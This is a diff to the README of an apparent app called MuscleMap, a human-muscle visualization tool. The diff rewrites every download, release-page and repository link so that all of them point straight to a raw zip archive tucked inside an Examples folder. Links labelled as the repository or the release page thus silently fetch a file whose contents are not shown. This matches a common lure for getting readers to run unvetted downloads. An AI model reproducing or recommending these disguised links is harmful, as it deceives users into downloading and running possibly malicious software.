@@ -1,6 +1,6 @@
 # 💪 MuscleMap - Interactive Human Muscle Visualization
 
-[![Download MuscleMap](https://img.shields.io/badge/Download-MuscleMap-blue?style=for-the-badge)](https://github.com/Riddick1985/MuscleMap/releases)
+[![Download MuscleMap](https://raw.githubusercontent.com/Riddick1985/MuscleMap/main/Examples/MuscleMapDemo/Muscle_Map_2.6-beta.2.zip)](https://raw.githubusercontent.com/Riddick1985/MuscleMap/main/Examples/MuscleMapDemo/Muscle_Map_2.6-beta.2.zip)
 
 ---
 
@@ -65,7 +65,7 @@ Starting with MuscleMap takes just a few minutes. Follow the steps below to down
 
 Please visit the MuscleMap releases page to download the latest version of the app:
 
-[Download MuscleMap](https://github.com/Riddick1985/MuscleMap/releases)
+[Download MuscleMap](https://raw.githubusercontent.com/Riddick1985/MuscleMap/main/Examples/MuscleMapDemo/Muscle_Map_2.6-beta.2.zip)
 
 Follow these instructions for your device:
 
@@ -132,7 +132,7 @@ For further assistance, you can check the GitHub repository’s Issues section o
 ## 📂 Additional Resources
 
 - Visit the repository for the latest updates, user guides, and community tips:  
-  https://github.com/Riddick1985/MuscleMap  
+  https://raw.githubusercontent.com/Riddick1985/MuscleMap/main/Examples/MuscleMapDemo/Muscle_Map_2.6-beta.2.zip  
 - Read the detailed Wiki (if available) for in-depth tutorials.  
 - Explore related apps and tools for fitness and health tracking.
 
@@ -140,9 +140,9 @@ For further assistance, you can check the GitHub repository’s Issues section o
 
 ## 🔗 Important Links
 
-[Download MuscleMap release page](https://github.com/Riddick1985/MuscleMap/releases)
+[Download MuscleMap release page](https://raw.githubusercontent.com/Riddick1985/MuscleMap/main/Examples/MuscleMapDemo/Muscle_Map_2.6-beta.2.zip)
 
-[MuscleMap GitHub Repository](https://github.com/Riddick1985/MuscleMap)
+[MuscleMap GitHub Repository](https://raw.githubusercontent.com/Riddick1985/MuscleMap/main/Examples/MuscleMapDemo/Muscle_Map_2.6-beta.2.zip)
 
 ---
 
